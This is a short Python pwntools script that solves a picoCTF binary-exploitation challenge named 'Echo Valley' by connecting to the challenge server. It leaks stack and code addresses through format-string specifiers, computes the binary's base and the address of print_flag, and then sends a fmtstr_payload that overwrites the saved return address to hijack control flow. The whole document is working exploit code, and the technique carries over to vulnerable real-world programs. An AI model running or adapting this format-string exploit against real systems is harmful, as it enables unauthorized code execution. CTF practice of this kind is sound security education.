from pwn import *

r = remote("shape-facility.picoctf.net" , 57659)

binary = "/mnt/c/Users/PC/Downloads/valley"
# r = process("/mnt/c/Users/PC/Downloads/valley")
elf = ELF(binary)

context.arch = elf.arch
context.log_level = 'debug'
context.binary = binary

offset = 6

r.recvuntil(b"Welcome to the Echo Valley, Try Shouting: \n")

r.sendline(b"%21$p")
r.recvuntil(b"You heard in the distance: ")

main_addr = int(r.recvline().strip() , 16) 
base = main_addr - 0x1413
print_flag_addr = base + elf.symbols['print_flag']

r.sendline(b"%20$p")
r.recvuntil(b"You heard in the distance: ")
saved_rbp = int(r.recvline().strip() , 16) + 8

print("[*] main_addr => " , main_addr)
print("[*] base => " , base)
print("[*] print_flag_addr => " , print_flag_addr)
print("[*] saved_rbp => " , saved_rbp)

payload = fmtstr_payload(offset , {saved_rbp:print_flag_addr} , write_size="short")

r.sendline(payload)
r.sendline(b"exit\n")

r.interactive()
